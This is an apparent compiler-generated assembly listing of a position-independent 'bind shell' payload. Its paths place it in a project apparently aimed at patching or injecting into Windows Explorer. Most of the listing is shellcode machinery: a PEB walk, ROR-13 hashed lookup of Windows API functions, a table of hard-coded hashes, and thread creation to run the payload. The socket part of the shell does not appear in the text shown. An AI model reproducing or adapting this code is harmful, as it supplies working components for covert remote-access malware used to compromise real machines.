; Listing generated by Microsoft (R) Optimizing Compiler Version 17.00.50727.1 

	TITLE	E:\Sources\Asm\p4tch_explorer\payload\PIC_Bindshell\PIC_Bindshell\BindShell.c
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB OLDNAMES

PUBLIC	_end_of_file
PUBLIC	_Daemon@4
PUBLIC	_ExecutePayload
PUBLIC	_InitialFuncs
PUBLIC	_GetProcAddressWithHash
; Function compile flags: /Ogspy
;	COMDAT _GetProcAddressWithHash
_TEXT	SEGMENT
_dwExportDirRVA$1$ = -16				; size = 4
_dwNumFunctions$1$ = -12				; size = 4
_BaseDllName$1$ = -12					; size = 4
_dwModuleFunctionHash$1$ = -8				; size = 4
_pdwFunctionNameBase$1$ = -4				; size = 4
_GetProcAddressWithHash PROC				; COMDAT
; _dwModuleFunctionHash$ = ecx
; File e:\sources\asm\p4tch_explorer\payload\pic_bindshell\pic_bindshell\getprocaddresswithhash.h
; Line 34
	sub	esp, 16					; 00000010H
; Line 61
	mov	eax, DWORD PTR fs:48
	push	ebx
; Line 66
	mov	eax, DWORD PTR [eax+12]
	push	ebp
	push	esi
	mov	esi, DWORD PTR [eax+12]
	push	edi
	mov	DWORD PTR _dwModuleFunctionHash$1$[esp+32], ecx
; Line 68
	jmp	$LN5@GetProcAdd
$LL15@GetProcAdd:
; Line 72
	mov	eax, DWORD PTR [esi+48]
	mov	ebx, DWORD PTR [esi+44]
; Line 77
	mov	esi, DWORD PTR [esi]
	mov	DWORD PTR _BaseDllName$1$[esp+32], eax
	mov	eax, DWORD PTR [edx+60]
	xor	ecx, ecx
	mov	ebp, DWORD PTR [eax+edx+120]
	mov	DWORD PTR _dwExportDirRVA$1$[esp+32], ebp
; Line 80
	test	ebp, ebp
	je	SHORT $LN5@GetProcAdd
; Line 86
	shr	ebx, 16					; 00000010H
	xor	edi, edi
	test	ebx, ebx
	je	SHORT $LN10@GetProcAdd
	mov	ebp, DWORD PTR _BaseDllName$1$[esp+32]
$LL12@GetProcAdd:
; Line 90
	ror	ecx, 13					; 0000000dH
; Line 92
	mov	al, BYTE PTR [edi+ebp]
	cmp	al, 97					; 00000061H
; Line 94
	movsx	eax, al
	jl	SHORT $LN9@GetProcAdd
	add	ecx, -32				; ffffffe0H
$LN9@GetProcAdd:
; Line 98
	add	ecx, eax
	inc	edi
	cmp	edi, ebx
	jb	SHORT $LL12@GetProcAdd
	mov	ebp, DWORD PTR _dwExportDirRVA$1$[esp+32]
$LN10@GetProcAdd:
; Line 104
	mov	edi, DWORD PTR [edx+ebp+24]
; Line 105
	mov	eax, DWORD PTR [edx+ebp+32]
	add	eax, edx
; Line 107
	xor	ebx, ebx
	mov	DWORD PTR _dwNumFunctions$1$[esp+32], edi
	test	edi, edi
	je	SHORT $LN5@GetProcAdd
$LL7@GetProcAdd:
; Line 110
	mov	ebp, DWORD PTR [eax]
	xor	edi, edi
	add	ebp, edx
; Line 111
	add	eax, 4
	mov	DWORD PTR _pdwFunctionNameBase$1$[esp+32], eax
$LL4@GetProcAdd:
; Line 118
	ror	edi, 13					; 0000000dH
	movsx	eax, BYTE PTR [ebp]
	add	edi, eax
; Line 119
	inc	ebp
; Line 120
	cmp	BYTE PTR [ebp-1], 0
	jne	SHORT $LL4@GetProcAdd
; Line 122
	lea	eax, DWORD PTR [edi+ecx]
; Line 124
	cmp	eax, DWORD PTR _dwModuleFunctionHash$1$[esp+32]
	je	SHORT $LN23@GetProcAdd
; Line 107
	mov	eax, DWORD PTR _pdwFunctionNameBase$1$[esp+32]
	inc	ebx
	cmp	ebx, DWORD PTR _dwNumFunctions$1$[esp+32]
	jb	SHORT $LL7@GetProcAdd
$LN5@GetProcAdd:
; Line 68
	mov	edx, DWORD PTR [esi+24]
	test	edx, edx
	jne	$LL15@GetProcAdd
; Line 133
	xor	eax, eax
$LN16@GetProcAdd:
; Line 134
	pop	edi
	pop	esi
	pop	ebp
	pop	ebx
	add	esp, 16					; 00000010H
	ret	0
$LN23@GetProcAdd:
; Line 126
	mov	esi, DWORD PTR _dwExportDirRVA$1$[esp+32]
	mov	eax, DWORD PTR [esi+edx+36]
	lea	eax, DWORD PTR [eax+ebx*2]
; Line 127
	movzx	ecx, WORD PTR [eax+edx]
	mov	eax, DWORD PTR [esi+edx+28]
	lea	eax, DWORD PTR [eax+ecx*4]
	mov	eax, DWORD PTR [eax+edx]
	add	eax, edx
	jmp	SHORT $LN16@GetProcAdd
_GetProcAddressWithHash ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT _InitialFuncs
_TEXT	SEGMENT
_InitialFuncs PROC					; COMDAT
; _pf$ = ecx
; File e:\sources\asm\p4tch_explorer\payload\pic_bindshell\pic_bindshell\winapideclare.h
; Line 107
	push	esi
	mov	esi, ecx
; Line 110
	mov	ecx, 119961420				; 0726774cH
	call	_GetProcAddressWithHash
; Line 112
	mov	ecx, 123110213				; 07568345H
	mov	DWORD PTR [esi], eax
	call	_GetProcAddressWithHash
; Line 113
	mov	ecx, -533335996				; e035f044H
	mov	DWORD PTR [esi+4], eax
	call	_GetProcAddressWithHash
; Line 114
	mov	ecx, 369977400				; 160d6838H
	mov	DWORD PTR [esi+8], eax
	call	_GetProcAddressWithHash
; Line 115
	mov	ecx, -558432828				; deb6fdc4H
	mov	DWORD PTR [esi+12], eax
	call	_GetProcAddressWithHash
; Line 116
	mov	ecx, 1384617670				; 528796c6H
	mov	DWORD PTR [esi+16], eax
	call	_GetProcAddressWithHash
	mov	DWORD PTR [esi+20], eax
; Line 119
	pop	esi
	ret	0
_InitialFuncs ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT _ExecutePayload
_TEXT	SEGMENT
_f$ = -28						; size = 24
_dwThreadId$ = -4					; size = 4
_ExecutePayload PROC					; COMDAT
; File e:\sources\asm\p4tch_explorer\payload\pic_bindshell\pic_bindshell\bindshell.c
; Line 26
	push	ebp
	mov	ebp, esp
	sub	esp, 28					; 0000001cH
	push	esi
; Line 55
	mov	ecx, 119961420				; 0726774cH
	call	_GetProcAddressWithHash
; Line 57
	mov	ecx, 123110213				; 07568345H
	mov	DWORD PTR _f$[ebp], eax
	call	_GetProcAddressWithHash
; Line 61
	lea	ecx, DWORD PTR _f$[ebp]
	mov	DWORD PTR _f$[ebp+4], eax
	call	_InitialFuncs
; Line 62
	xor	esi, esi
	push	esi
	push	esi
	push	esi
	push	esi
	call	DWORD PTR _f$[ebp+4]
; Line 71
	lea	eax, DWORD PTR _dwThreadId$[ebp]
	push	eax
	push	esi
	push	esi
	push	DWORD PTR _f$[ebp+4]
	push	esi
	push	esi
	call	DWORD PTR _f$[ebp+12]
; Line 123
	jmp	_end_of_file
; Line 122
	pop	esi
; Line 126
	leave
	ret	0
_ExecutePayload ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT _Daemon@4
_TEXT	SEGMENT
_f$ = -28						; size = 24
_lpThreadParameter$ = 8					; size = 4
_Daemon@4 PROC						; COMDAT
; File e:\sources\asm\p4tch_explorer\payload\pic_bindshell\pic_bindshell\bindshell.c
; Line 128
	push	ebp
	mov	ebp, esp
	sub	esp, 28					; 0000001cH
; Line 131
	lea	ecx, DWORD PTR _f$[ebp]
	call	_InitialFuncs
; Line 132
	xor	eax, eax
	push	eax
	push	eax
	push	eax
	push	eax
	call	DWORD PTR _f$[ebp+4]
; Line 133
	xor	eax, eax
; Line 134
	leave
	ret	4
_Daemon@4 ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT _end_of_file
_TEXT	SEGMENT
_end_of_file PROC					; COMDAT
; File e:\sources\asm\p4tch_explorer\payload\pic_bindshell\pic_bindshell\bindshell.c
; Line 139
	npad	1
_end_of_file ENDP
_TEXT	ENDS
END
